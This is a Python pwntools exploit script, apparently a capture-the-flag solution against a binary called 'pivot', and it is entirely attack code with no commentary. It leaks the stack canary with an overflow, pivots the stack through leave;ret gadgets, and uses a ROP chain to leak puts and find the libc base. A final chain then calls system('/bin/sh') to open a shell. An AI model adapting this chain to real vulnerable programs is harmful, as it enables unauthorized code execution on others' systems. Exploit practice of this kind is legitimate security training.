from pwn import *
import sys
remote_addr = ["",]
libc=ELF('./libc.so.6')
elf = ELF('./pivot')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pivot_patched")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

gdb.attach(p)
main = p64(0x4011d4)
pop_rdi = p64(0x401343)
puts_got = p64(elf.got['puts'])
puts_plt = p64(elf.plt['puts'])
leave_ret = p64(0x401213)
ret = p64(0x40101a)

ru(b'Name:\n')
payload = b'a' * (0x28 + 1) 
s(payload)
ru(b'a'*0x28)
canary = u64(rc(8)) - 0x61
pr('canary', canary)
ru(b'\n')
payload = b'a' * (0x108) + p64(canary) + p64(0x404f00) + main
s(payload)
ru(b'G00DBYE.\n')
payload = pop_rdi + puts_got + puts_plt + p64(0x4011ba)
payload = payload.ljust(0x108, b'a') + p64(canary) + p64(0x404df0 - 8) + leave_ret
s(payload)

leak_addr = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
pr('leak_addr', leak_addr)
libc_base = leak_addr - libc.sym['puts']
pr('libc_base', libc_base)
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

ru(b'\n')
payload = ret + pop_rdi + p64(binsh) + p64(system)
payload = payload.ljust(0x108, b'a') + p64(canary) + p64(0x404cf8 - 8) + leave_ret
s(payload)

shell()
